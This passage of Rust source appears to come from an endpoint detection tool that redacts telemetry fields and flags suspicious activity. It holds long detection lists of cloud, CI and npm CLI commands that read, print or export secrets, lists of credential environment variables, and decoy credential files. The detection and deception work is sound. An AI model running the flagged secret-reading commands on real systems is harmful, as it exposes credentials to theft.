                image,
                privacy_mode,
                "process paths may include local usernames or project names",
            );
            push_local(
                projections,
                "event.processExec.args",
                args.join(" "),
                privacy_mode,
                "process arguments may contain secrets, prompts, paths, or customer data",
            );
            if !env.is_empty() {
                push_local(
                    projections,
                    "event.processExec.env",
                    serde_json::to_string(env).unwrap_or_default(),
                    privacy_mode,
                    "environment variables may contain credentials",
                );
            }
        }
        EndpointEvent::FileAccess {
            operation,
            path,
            source_url,
            content_preview,
        } => {
            push_metadata(
                projections,
                "event.fileAccess.operation",
                format!("{operation:?}"),
                privacy_mode,
                "file operation is a normalized event feature",
            );
            push_hash(
                projections,
                "event.fileAccess.path",
                path,
                privacy_mode,
                "file paths may include local usernames, project names, or document names",
            );
            push_optional_hash(
                projections,
                "event.fileAccess.sourceUrl",
                source_url.as_deref(),
                privacy_mode,
                "source URLs may contain internal hosts or query strings",
            );
            push_optional_local(
                projections,
                "event.fileAccess.contentPreview",
                content_preview.as_deref(),
                privacy_mode,
                "file content previews are raw artifacts",
            );
        }
        EndpointEvent::NetworkFlow {
            host,
            port,
            protocol,
            url,
        } => {
            push_hash(
                projections,
                "event.networkFlow.host",
                host,
                privacy_mode,
                "network hosts may reveal internal infrastructure",
            );
            push_metadata(
                projections,
                "event.networkFlow.port",
                port.to_string(),
                privacy_mode,
                "network port is a normalized event feature",
            );
            push_optional_metadata(
                projections,
                "event.networkFlow.protocol",
                protocol.clone(),
                privacy_mode,
                "network protocol is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.networkFlow.url",
                url.as_deref(),
                privacy_mode,
                "URLs may contain paths, query strings, or tenant data",
            );
        }
        EndpointEvent::DnsLookup {
            query,
            record_type,
            answers,
            resolver,
            status,
        } => {
            push_hash(
                projections,
                "event.dnsLookup.query",
                query,
                privacy_mode,
                "DNS queries may reveal internal infrastructure or customer domains",
            );
            push_optional_metadata(
                projections,
                "event.dnsLookup.recordType",
                record_type.clone(),
                privacy_mode,
                "DNS record type is a normalized event feature",
            );
            if !answers.is_empty() {
                push_hash(
                    projections,
                    "event.dnsLookup.answers",
                    answers.join(","),
                    privacy_mode,
                    "DNS answers may include internal infrastructure",
                );
            }
            push_optional_hash(
                projections,
                "event.dnsLookup.resolver",
                resolver.as_deref(),
                privacy_mode,
                "DNS resolvers may identify internal networks",
            );
            push_optional_metadata(
                projections,
                "event.dnsLookup.status",
                status.clone(),
                privacy_mode,
                "DNS status is a normalized event feature",
            );
        }
        EndpointEvent::PackageScript {
            manager,
            package,
            phase,
            script,
            working_directory,
        } => {
            push_metadata(
                projections,
                "event.packageScript.manager",
                manager.as_str(),
                privacy_mode,
                "package manager is a normalized event feature",
            );
            push_metadata(
                projections,
                "event.packageScript.phase",
                phase,
                privacy_mode,
                "package lifecycle phase is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.packageScript.package",
                package.as_deref(),
                privacy_mode,
                "package names may reveal private dependencies",
            );
            push_local(
                projections,
                "event.packageScript.script",
                script,
                privacy_mode,
                "package scripts are raw execution artifacts",
            );
            push_optional_hash(
                projections,
                "event.packageScript.workingDirectory",
                working_directory.as_deref(),
                privacy_mode,
                "working directories may include local usernames or repository names",
            );
        }
        EndpointEvent::DylibLoad {
            path,
            target_image,
            mechanism,
        } => {
            push_hash(
                projections,
                "event.dylibLoad.path",
                path,
                privacy_mode,
                "library paths may include local usernames or project names",
            );
            push_optional_hash(
                projections,
                "event.dylibLoad.targetImage",
                target_image.as_deref(),
                privacy_mode,
                "target image paths may include local usernames or project names",
            );
            push_optional_metadata(
                projections,
                "event.dylibLoad.mechanism",
                mechanism.clone(),
                privacy_mode,
                "load mechanism is a normalized event feature",
            );
        }
        EndpointEvent::LaunchPersistence {
            path,
            label,
            operation,
        } => {
            push_hash(
                projections,
                "event.launchPersistence.path",
                path,
                privacy_mode,
                "persistence paths may include local usernames or app-specific names",
            );
            push_optional_hash(
                projections,
                "event.launchPersistence.label",
                label.as_deref(),
                privacy_mode,
                "launch labels may reveal private tooling",
            );
            push_metadata(
                projections,
                "event.launchPersistence.operation",
                format!("{operation:?}"),
                privacy_mode,
                "persistence operation is a normalized event feature",
            );
        }
        EndpointEvent::BrowserExtensionInstall {
            browser,
            extension_id,
            path,
            source,
        } => {
            push_metadata(
                projections,
                "event.browserExtensionInstall.browser",
                browser,
                privacy_mode,
                "browser family is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.browserExtensionInstall.extensionId",
                extension_id.as_deref(),
                privacy_mode,
                "extension IDs are correlated by hash by default",
            );
            push_hash(
                projections,
                "event.browserExtensionInstall.path",
                path,
                privacy_mode,
                "extension paths may include local usernames",
            );
            push_optional_hash(
                projections,
                "event.browserExtensionInstall.source",
                source.as_deref(),
                privacy_mode,
                "extension source may include internal locations",
            );
        }
        EndpointEvent::BrowserDownload {
            browser,
            path,
            source_url,
            content_hash,
            byte_count,
        } => {
            push_metadata(
                projections,
                "event.browserDownload.browser",
                browser,
                privacy_mode,
                "browser family is a normalized event feature",
            );
            push_hash(
                projections,
                "event.browserDownload.path",
                path,
                privacy_mode,
                "download paths may include local usernames or document names",
            );
            push_optional_hash(
                projections,
                "event.browserDownload.sourceUrl",
                source_url.as_deref(),
                privacy_mode,
                "download URLs may contain internal hosts or query strings",
            );
            push_optional_metadata(
                projections,
                "event.browserDownload.contentHash",
                content_hash.clone(),
                privacy_mode,
                "download content hashes are privacy-safe artifact proof",
            );
            push_optional_metadata(
                projections,
                "event.browserDownload.byteCount",
                byte_count.map(|value| value.to_string()),
                privacy_mode,
                "download byte count is a bounded artifact feature",
            );
        }
        EndpointEvent::CredentialAccess { kind, path, name } => {
            push_metadata(
                projections,
                "event.credentialAccess.kind",
                kind.as_str(),
                privacy_mode,
                "credential kind is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.credentialAccess.path",
                path.as_deref(),
                privacy_mode,
                "credential paths may include local usernames or secret store names",
            );
            push_optional_hash(
                projections,
                "event.credentialAccess.name",
                name.as_deref(),
                privacy_mode,
                "credential names are correlated by hash by default",
            );
        }
        EndpointEvent::ToolCall {
            tool_name,
            parameters,
        } => {
            push_metadata(
                projections,
                "event.toolCall.toolName",
                tool_name,
                privacy_mode,
                "tool names are normalized agent features",
            );
            push_local(
                projections,
                "event.toolCall.parameters",
                serde_json::to_string(parameters).unwrap_or_default(),
                privacy_mode,
                "tool parameters may contain prompts, file contents, or secrets",
            );
        }
        EndpointEvent::PolicyDecision {
            action,
            target,
            decision,
            guard,
            severity,
        } => {
            push_metadata(
                projections,
                "event.policyDecision.action",
                action,
                privacy_mode,
                "policy action is a normalized decision feature",
            );
            push_optional_hash(
                projections,
                "event.policyDecision.target",
                target.as_deref(),
                privacy_mode,
                "policy targets may include paths, hosts, or credential names",
            );
            push_metadata(
                projections,
                "event.policyDecision.decision",
                decision,
                privacy_mode,
                "policy decision is a normalized decision feature",
            );
            push_optional_metadata(
                projections,
                "event.policyDecision.guard",
                guard.clone(),
                privacy_mode,
                "guard identifier is a normalized decision feature",
            );
            push_optional_metadata(
                projections,
                "event.policyDecision.severity",
                severity.clone(),
                privacy_mode,
                "severity is a normalized decision feature",
            );
        }
        EndpointEvent::Other { category, fields } => {
            push_metadata(
                projections,
                "event.other.category",
                category,
                privacy_mode,
                "custom event category is a normalized feature",
            );
            if !fields.is_empty() {
                push_local(
                    projections,
                    "event.other.fields",
                    serde_json::to_string(fields).unwrap_or_default(),
                    privacy_mode,
                    "custom event fields may contain arbitrary raw artifacts",
                );
            }
        }
    }
}

fn count_projection_class(
    observations: &[EndpointTelemetryObservationProjection],
    redaction_class: EndpointEvidenceRedactionClass,
) -> usize {
    observations
        .iter()
        .flat_map(|observation| observation.projections.iter())
        .filter(|projection| projection.redaction_class == redaction_class)
        .count()
}

fn push_optional_metadata(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<String>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.filter(|value| !value.trim().is_empty()) {
        push_metadata(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_metadata(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let redaction_class = if *privacy_mode == EndpointTelemetryPrivacyMode::LocalOnly {
        EndpointEvidenceRedactionClass::LocalOnly
    } else {
        EndpointEvidenceRedactionClass::MetadataOnly
    };
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class,
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| value.to_string()),
        raw_value: None,
        reason: reason.into(),
    });
}

fn push_optional_hash(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<&str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        push_hash(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_hash(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let redaction_class = if *privacy_mode == EndpointTelemetryPrivacyMode::LocalOnly {
        EndpointEvidenceRedactionClass::LocalOnly
    } else {
        EndpointEvidenceRedactionClass::HashOnly
    };
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class,
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| privacy_feature(value)),
        raw_value: None,
        reason: reason.into(),
    });
}

fn push_optional_local(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<&str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        push_local(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_local(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let raw_permitted = privacy_mode.permits_raw_artifacts();
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class: if raw_permitted {
            EndpointEvidenceRedactionClass::RawArtifactPermitted
        } else {
            EndpointEvidenceRedactionClass::LocalOnly
        },
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| privacy_feature(value)),
        raw_value: raw_permitted.then(|| value.to_string()),
        reason: reason.into(),
    });
}

fn privacy_feature(value: &str) -> String {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return "empty".to_string();
    }
    if let Some((scheme, _)) = trimmed.split_once("://") {
        return format!("url_scheme:{scheme}");
    }
    if trimmed.contains('/') || trimmed.contains('\\') {
        let normalized = normalize_path_string(trimmed);
        let extension = Path::new(&normalized)
            .extension()
            .and_then(|extension| extension.to_str())
            .filter(|extension| !extension.is_empty());
        return extension
            .map(|extension| format!("path_extension:{extension}"))
            .unwrap_or_else(|| "path".to_string());
    }
    format!("len:{}", trimmed.len())
}

fn command_looks_like_package_manager(image: &str, args: &[String]) -> bool {
    let image = image.to_ascii_lowercase();
    let args = args.join(" ").to_ascii_lowercase();
    [
        "npm", "pnpm", "yarn", "pip", "pip3", "cargo", "brew", "go", "gem", "bundle",
    ]
    .iter()
    .any(|name| image.ends_with(name) || image.contains(&format!("/{name}")))
        || args.contains(" npm ")
        || args.contains(" pip ")
        || args.contains(" cargo ")
}

fn package_registry_cli_name<'a>(image: &'a str, args: &'a [String]) -> Option<&'static str> {
    let image = image.to_ascii_lowercase();
    let first_arg = args
        .first()
        .map(|value| value.to_ascii_lowercase())
        .unwrap_or_default();
    [("npm", "npm"), ("pnpm", "pnpm"), ("yarn", "yarn")]
        .into_iter()
        .find_map(|(binary, manager)| {
            let image_matches = image == binary
                || image.ends_with(&format!("/{binary}"))
                || image.contains(&format!("/{binary}-"));
            let arg_matches = first_arg == binary || first_arg.ends_with(&format!("/{binary}"));
            (image_matches || arg_matches).then_some(manager)
        })
}

fn suspicious_package_registry_cli_reason(args: &[String]) -> Option<&'static str> {
    let args = args.join(" ").to_ascii_lowercase();
    [
        ("token list", "lists npm authentication tokens"),
        ("token create", "creates an npm authentication token"),
        ("token revoke", "revokes an npm authentication token"),
        ("token delete", "deletes an npm authentication token"),
        (
            "config get",
            "reads package manager registry authentication configuration",
        ),
        (
            "config set",
            "writes package manager registry authentication configuration",
        ),
        (
            "config delete",
            "deletes package manager registry authentication configuration",
        ),
    ]
    .into_iter()
    .find_map(|(needle, reason)| {
        if args.contains(needle)
            && (needle.starts_with("token ") || package_registry_auth_config_reference(&args))
        {
            Some(reason)
        } else {
            None
        }
    })
}

fn package_registry_auth_config_reference(args: &str) -> bool {
    args.contains("_authtoken")
        || args.contains("node_auth_token")
        || args.contains("npm_token")
        || args.contains("npm_config_")
}

fn package_registry_credential_env_keys(env: &BTreeMap<String, String>) -> Vec<String> {
    env.keys()
        .filter(|key| {
            matches!(
                key.to_ascii_uppercase().as_str(),
                "NODE_AUTH_TOKEN"
                    | "NPM_TOKEN"
                    | "NPM_CONFIG_TOKEN"
                    | "NPM_CONFIG__AUTH"
                    | "NPM_CONFIG__AUTHTOKEN"
                    | "YARN_NPM_AUTH_TOKEN"
            )
        })
        .cloned()
        .collect()
}

fn cloud_cli_name<'a>(image: &'a str, args: &'a [String]) -> Option<&'static str> {
    let image = image.to_ascii_lowercase();
    let first_arg = args
        .first()
        .map(|value| value.to_ascii_lowercase())
        .unwrap_or_default();
    [
        ("aws", "aws"),
        ("gcloud", "gcloud"),
        ("az", "az"),
        ("doctl", "doctl"),
        ("fly", "fly"),
        ("flyctl", "fly"),
        ("gh", "gh"),
        ("vercel", "vercel"),
        ("netlify", "netlify"),
        ("wrangler", "wrangler"),
        ("op", "op"),
        ("vault", "vault"),
        ("doppler", "doppler"),
        ("heroku", "heroku"),
        ("supabase", "supabase"),
        ("firebase", "firebase"),
        ("railway", "railway"),
        ("stripe", "stripe"),
        ("sentry-cli", "sentry"),
        ("snyk", "snyk"),
        ("bw", "bitwarden"),
        ("kubectl", "kubectl"),
        ("pulumi", "pulumi"),
        ("circleci", "circleci"),
        ("glab", "glab"),
        ("buildkite-agent", "buildkite"),
        ("bk", "buildkite"),
        ("drone", "drone"),
        ("sem", "semaphore"),
        ("semaphore", "semaphore"),
        ("appveyor", "appveyor"),
        ("woodpecker", "woodpecker"),
        ("codefresh", "codefresh"),
        ("terraform", "terraform"),
        ("terragrunt", "terragrunt"),
        ("tofu", "opentofu"),
    ]
    .into_iter()
    .find_map(|(binary, cli_name)| {
        let image_matches = image == binary
            || image.ends_with(&format!("/{binary}"))
            || image.contains(&format!("/{binary}-"));
        let arg_matches = first_arg == binary || first_arg.ends_with(&format!("/{binary}"));
        (image_matches || arg_matches).then_some(cli_name)
    })
}

fn suspicious_cloud_cli_reason(args: &[String]) -> Option<&'static str> {
    let args = args.join(" ").to_ascii_lowercase();
    [
        (
            "secretsmanager get-secret-value",
            "reads an AWS Secrets Manager secret value",
        ),
        ("ssm get-parameter", "reads an AWS SSM parameter value"),
        ("ssm get-parameters", "reads AWS SSM parameter values"),
        ("iam create-access-key", "creates a new AWS IAM access key"),
        (
            "iam put-user-policy",
            "modifies an AWS IAM inline user policy",
        ),
        (
            "iam attach-user-policy",
            "attaches an AWS IAM policy to a user",
        ),
        (
            "ecr get-login-password",
            "exports an AWS ECR registry login password",
        ),
        (
            "auth print-access-token",
            "prints a cloud OAuth access token",
        ),
        (
            "secrets versions access",
            "reads a GCP Secret Manager secret version",
        ),
        (
            "iam service-accounts keys create",
            "creates a GCP service account key",
        ),
        ("keyvault secret show", "reads an Azure Key Vault secret"),
        (
            "keyvault secret download",
            "downloads an Azure Key Vault secret",
        ),
        (
            "account get-access-token",
            "prints an Azure account access token",
        ),
        (
            "ad app credential reset",
            "resets Azure application credentials",
        ),
        (
            "secret set",
            "writes a GitHub repository or organization secret",
        ),
        (
            "versions secret put",
            "writes a Cloudflare Worker version secret",
        ),
        (
            "versions secret bulk",
            "bulk imports Cloudflare Worker version secrets",
        ),
        ("secret put", "writes a Cloudflare Worker or Pages secret"),
        ("secret bulk", "bulk imports Cloudflare Worker secrets"),
        (
            "registry docker-config",
            "prints DigitalOcean registry Docker credentials",
        ),
        (
            "registry login",
            "writes DigitalOcean registry credentials locally",
        ),
        (
            "kubernetes cluster kubeconfig save",
            "writes DigitalOcean Kubernetes access credentials locally",
        ),
        ("secrets set", "writes a Fly.io app secret"),
        ("secrets import", "imports Fly.io app secrets"),
        ("secrets unset", "removes a Fly.io app secret"),
        ("secrets list", "lists Fly.io app secrets"),
        ("tokens create", "creates a Fly.io API token"),
        ("tokens revoke", "revokes a Fly.io API token"),
        ("secret get", "reads a cloud or CI platform secret"),
        ("secret list", "lists cloud CLI secrets"),
        ("secret create", "creates a cloud or CI platform secret"),
        ("secret update", "updates a cloud or CI platform secret"),
        ("secret delete", "deletes a cloud CLI secret"),
        ("auth token", "prints a GitHub CLI authentication token"),
        (
            "variable set",
            "writes a CI/CD or developer-platform variable",
        ),
        (
            "variable update",
            "updates a CI/CD or developer-platform variable",
        ),
        (
            "variable delete",
            "deletes a CI/CD or developer-platform variable",
        ),
        (
            "variable get",
            "reads a CI/CD or developer-platform variable",
        ),
        (
            "variable list",
            "lists CI/CD or developer-platform variables",
        ),
        (
            "variable export",
            "exports CI/CD or developer-platform variables",
        ),
        ("env pull", "pulls Vercel environment variables locally"),
        ("env add", "writes a Vercel project environment variable"),
        ("env rm", "removes a Vercel project environment variable"),
        (
            "env remove",
            "removes a Vercel project environment variable",
        ),
        ("env ls", "lists Vercel project environment variables"),
        ("env:get", "retrieves a Netlify environment variable"),
        ("env:list", "lists Netlify environment variables"),
        ("env:set", "writes a Netlify environment variable"),
        ("env:import", "imports Netlify environment variables"),
        ("env:unset", "deletes a Netlify environment variable"),
        ("item get", "reads a 1Password item"),
        ("get item", "reads a password-manager item"),
        ("document get", "reads a 1Password document"),
        ("op://", "reads a 1Password secret reference"),
        ("kv get", "reads a Vault KV secret"),
        ("read secret/", "reads a Vault secret path"),
        ("token create", "creates an access token"),
        ("secrets download", "downloads application secrets"),
        ("configs tokens create", "creates a Doppler config token"),
        ("config:get", "reads a platform environment variable"),
        ("config:set", "writes a platform environment variable"),
        ("secrets pull", "downloads project secrets"),
        (
            "functions:secrets:access",
            "reads a Firebase Functions secret",
        ),
        (
            "functions:secrets:set",
            "writes a Firebase Functions secret",
        ),
        ("variables", "reads or writes Railway service variables"),
        (
            "login --auth-token",
            "logs into a developer platform with an auth token",
        ),
        (
            "auth --auth-token",
            "authenticates a developer security tool with an auth token",
        ),
        ("get secret", "reads a Kubernetes Secret object"),
        ("describe secret", "describes a Kubernetes Secret object"),
        (
            "config view --raw",
            "prints raw Kubernetes credential configuration",
        ),
        (
            "--show-secrets",
            "prints secret values from developer platform configuration",
        ),
        ("context store-secret", "writes a CircleCI context secret"),
        ("context remove-secret", "removes a CircleCI context secret"),
        ("runner token create", "creates a CircleCI runner token"),
        ("runner token list", "lists CircleCI runner tokens"),
        ("secret add", "writes a CI platform secret"),
        ("secret rm", "removes a CI platform secret"),
        ("secret remove", "removes a CI platform secret"),
        ("auth create-token", "creates a CI platform API token"),
        ("encrypt --secret", "encrypts CI platform secret material"),
        (
            "context create",
            "creates CI platform context or credential material",
        ),
        (
            "login --api-key",
            "authenticates Stripe CLI with an inline API key",
        ),
        (
            "listen --print-secret",
            "prints a Stripe webhook signing secret",
        ),
        ("output -json", "prints Terraform output values"),
        ("output -raw", "prints a Terraform output value"),
        ("state pull", "exports Terraform state"),
        ("state show", "prints Terraform state for a resource"),
        ("show -json", "prints Terraform plan or state values"),
    ]
    .into_iter()
    .find_map(|(needle, reason)| args.contains(needle).then_some(reason))
}

fn cloud_credential_env_keys(env: &BTreeMap<String, String>) -> Vec<String> {
    env.keys()
        .filter(|key| {
            let upper = key.to_ascii_uppercase();
            upper.starts_with("TF_TOKEN_")
                || upper.starts_with("TERRAFORM_TOKEN")
                || matches!(
                    upper.as_str(),
                    "AWS_ACCESS_KEY_ID"
                        | "AWS_SECRET_ACCESS_KEY"
                        | "AWS_SESSION_TOKEN"
                        | "AWS_PROFILE"
                        | "GOOGLE_APPLICATION_CREDENTIALS"
                        | "CLOUDSDK_AUTH_ACCESS_TOKEN"
                        | "AZURE_CLIENT_ID"
                        | "AZURE_CLIENT_SECRET"
                        | "AZURE_TENANT_ID"
                        | "ARM_CLIENT_ID"
                        | "ARM_CLIENT_SECRET"
                        | "ARM_TENANT_ID"
                        | "GITHUB_TOKEN"
                        | "GH_TOKEN"
                        | "VERCEL_TOKEN"
                        | "NETLIFY_AUTH_TOKEN"
                        | "CLOUDFLARE_API_TOKEN"
                        | "CLOUDFLARE_API_KEY"
                        | "CLOUDFLARE_ACCESS_CLIENT_ID"
                        | "CLOUDFLARE_ACCESS_CLIENT_SECRET"
                        | "WRANGLER_R2_SQL_AUTH_TOKEN"
                        | "CF_API_TOKEN"
                        | "CF_API_KEY"
                        | "DIGITALOCEAN_ACCESS_TOKEN"
                        | "DO_API_TOKEN"
                        | "FLY_API_TOKEN"
                        | "FLY_ACCESS_TOKEN"
                        | "OP_SERVICE_ACCOUNT_TOKEN"
                        | "OP_CONNECT_TOKEN"
                        | "VAULT_TOKEN"
                        | "DOPPLER_TOKEN"
                        | "DOPPLER_SERVICE_TOKEN"
                        | "HEROKU_API_KEY"
                        | "SUPABASE_ACCESS_TOKEN"
                        | "SUPABASE_SERVICE_ROLE_KEY"
                        | "FIREBASE_TOKEN"
                        | "RAILWAY_TOKEN"
                        | "STRIPE_API_KEY"
                        | "STRIPE_WEBHOOK_SECRET"
                        | "SENTRY_AUTH_TOKEN"
                        | "SNYK_TOKEN"
                        | "BW_SESSION"
                        | "KUBECONFIG"
                        | "PULUMI_ACCESS_TOKEN"
                        | "PULUMI_CONFIG_PASSPHRASE"
                        | "CIRCLECI_CLI_TOKEN"
                        | "CIRCLE_TOKEN"
                        | "GITLAB_TOKEN"
                        | "GITLAB_ACCESS_TOKEN"
                        | "CI_JOB_TOKEN"
                        | "BUILDKITE_AGENT_ACCESS_TOKEN"
                        | "BUILDKITE_API_TOKEN"
                        | "DRONE_TOKEN"
                        | "DRONE_NETRC_PASSWORD"
                        | "SEMAPHORE_API_TOKEN"
                        | "SEMAPHORE_OIDC_TOKEN"
                        | "APPVEYOR_API_TOKEN"
                        | "APPVEYOR_TOKEN"
                        | "WOODPECKER_TOKEN"
                        | "CODEFRESH_API_KEY"
                        | "TFE_TOKEN"
                )
        })
        .cloned()
        .collect()
}

fn observed_path(observation: &EndpointObservation) -> Option<&str> {
    match &observation.event {
        EndpointEvent::FileAccess { path, .. }
        | EndpointEvent::DylibLoad { path, .. }
        | EndpointEvent::LaunchPersistence { path, .. }
        | EndpointEvent::BrowserExtensionInstall { path, .. }
        | EndpointEvent::BrowserDownload { path, .. } => Some(path),
        EndpointEvent::CredentialAccess { path, .. } => path.as_deref(),
        _ => None,
    }
}

fn honey_artifact_match_evidence(
    artifact: &HoneyArtifact,
    observation: &EndpointObservation,
) -> Option<Vec<DetectionEvidence>> {
    let mut evidence = vec![
        ev("artifactId", &artifact.artifact_id),
        ev("artifactKind", artifact.kind.as_str()),
        ev("artifactPath", artifact.relative_path.display().to_string()),
    ];

    if let Some(accessed_path) = observed_path(observation) {
        if artifact.matches_path(accessed_path) {
            evidence.push(ev("matchType", "path"));
            evidence.push(ev("observedPath", accessed_path));
            return Some(evidence);
        }
    }

    if let EndpointEvent::NetworkFlow { host, url, .. } = &observation.event {
        if artifact.matches_network_destination(host, url.as_deref()) {
            evidence.push(ev("matchType", "network_destination"));
            evidence.push(ev("observedHost", host));
            if let Some(url) = url {
                evidence.push(ev("observedUrl", url));
            }
            if let Some(honey_host) = artifact.internal_hostname() {
                evidence.push(ev("honeyHost", honey_host));
            }
            return Some(evidence);
        }
    }

    if let EndpointEvent::DnsLookup { query, answers, .. } = &observation.event {
        if artifact.matches_network_destination(query, None)
            || answers
                .iter()
                .any(|answer| artifact.matches_network_destination(answer, None))
        {
            evidence.push(ev("matchType", "dns_query"));
            evidence.push(ev("observedQuery", query));
            if !answers.is_empty() {
                evidence.push(ev("observedAnswers", answers.join(",")));
            }
            if let Some(honey_host) = artifact.internal_hostname() {
                evidence.push(ev("honeyHost", honey_host));
            }
            return Some(evidence);
        }
    }

    if let EndpointEvent::CredentialAccess { kind, name, .. } = &observation.event {
        if *kind == CredentialKind::BrowserCookie
            && artifact.matches_browser_cookie_access(name.as_deref())
        {
            evidence.push(ev("matchType", "browser_cookie"));
            if let Some(name) = name {
                evidence.push(ev("credentialName", name));
            }
            return Some(evidence);
        }
    }

    if observation_contains_marker(observation, &artifact.marker) {
        evidence.push(ev("matchType", "marker"));
        return Some(evidence);
    }

    None
}

fn observation_contains_marker(observation: &EndpointObservation, marker: &str) -> bool {
    if marker.is_empty() {
        return false;
    }
    match &observation.event {
        EndpointEvent::FileAccess {
            content_preview: Some(content),
            ..
        } if content.contains(marker) => true,
        _ => {
            serialized_contains_marker(&observation.event, marker)
                || serialized_contains_marker(&observation.metadata, marker)
        }
    }
}

fn serialized_contains_marker<T: Serialize>(value: &T, marker: &str) -> bool {
    serde_json::to_string(value)
        .map(|value| value.contains(marker))
        .unwrap_or(false)
}

fn honey_artifact(
    endpoint_id: &str,
    kind: HoneyArtifactKind,
    relative_path: &str,
) -> HoneyArtifact {
    let artifact_id = stable_id("honey", [endpoint_id, kind.as_str(), relative_path]);
    let marker = format!("clawdstrike-honey-{artifact_id}");
    let contents = honey_contents(&kind, endpoint_id, &marker);
    HoneyArtifact {
        artifact_id,
        kind,
        relative_path: PathBuf::from(relative_path),
        marker,
        contents,
        permissions_octal: 0o600,
        tags: vec!["deception".to_string(), "endpoint".to_string()],
    }
}

fn honey_contents(kind: &HoneyArtifactKind, endpoint_id: &str, marker: &str) -> String {
    match kind {
        HoneyArtifactKind::SshPrivateKey => format!(
            "# honey ssh key for endpoint {endpoint_id}\n# marker: {marker}\n-----BEGIN OPENSSH PRIVATE KEY-----\n{marker}\n-----END OPENSSH PRIVATE KEY-----\n"
        ),
        HoneyArtifactKind::ApiTokenFile => {
            format!("CLAWDSTRIKE_PROD_API_TOKEN=cs_live_{marker}\n")
        }
        HoneyArtifactKind::CloudCredentials => format!(
            "[prod]\naws_access_key_id = AKIA{marker}\naws_secret_access_key = {marker}\naws_session_token = {marker}\n"
        ),
        HoneyArtifactKind::PackageRegistryToken => {
            format!("//registry.npmjs.org/:_authToken=npm_{marker}\n")
        }
        HoneyArtifactKind::BrowserCookieJar => format!(
            "{{\"cookies\":[{{\"domain\":\"intranet.invalid\",\"name\":\"session\",\"value\":\"{marker}\"}}]}}\n"
        ),
        HoneyArtifactKind::InternalHostname => {
            format!("prod-admin-{endpoint_id}.corp.invalid # {marker}\n")
        }
    }
}

fn ensure_safe_relative_path(path: &Path) -> Result<()> {
    if path.is_absolute() {
        return Err(anyhow!(
            "honey artifact path must be relative: {}",
            path.display()
        ));
    }
    for component in path.components() {
        if matches!(
            component,
            Component::ParentDir | Component::RootDir | Component::Prefix(_)
        ) {
            return Err(anyhow!(
                "honey artifact path contains unsafe component: {}",
                path.display()
            ));
        }
    }
    Ok(())
}

fn create_new_honey_file(path: &Path, artifact: &HoneyArtifact) -> std::io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(artifact.contents.as_bytes())?;
    set_file_permissions(path, artifact.permissions_octal)
}

#[cfg(unix)]
fn set_file_permissions(path: &Path, permissions_octal: u32) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;

    fs::set_permissions(path, fs::Permissions::from_mode(permissions_octal))
}

#[cfg(not(unix))]
fn set_file_permissions(_path: &Path, _permissions_octal: u32) -> std::io::Result<()> {
    Ok(())
}

fn normalize_path_string(path: &str) -> String {
    let replaced = path.replace('\\', "/");
    let is_absolute = replaced.starts_with('/');
    let normalized = replaced
        .split('/')
        .filter(|part| !part.is_empty() && *part != ".")
        .collect::<Vec<_>>()
        .join("/");

    if is_absolute {
        format!("/{normalized}")
    } else {
        normalized
    }
}

fn normalize_hostname(host: &str) -> String {
    host.trim()
        .trim_matches(['[', ']'])
        .trim_end_matches('.')
        .to_ascii_lowercase()
}

fn hostname_from_url_like(url: &str) -> Option<String> {
    let trimmed = url.trim();
    if trimmed.is_empty() {
        return None;
    }
    let without_scheme = trimmed
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(trimmed);
    let authority = without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme)
        .rsplit('@')
        .next()
        .unwrap_or(without_scheme)
        .trim();
    if authority.is_empty() {
        return None;
    }
    let host = if authority.starts_with('[') {
        let end = authority.find(']')?;
        &authority[..=end]
    } else {
        authority.split(':').next().unwrap_or(authority)
    };
    let normalized = normalize_hostname(host);
    (!normalized.is_empty()).then_some(normalized)
}

fn stable_id<'a>(prefix: &str, parts: impl IntoIterator<Item = &'a str>) -> String {
    let mut hash = FNV_OFFSET;
    for part in parts {
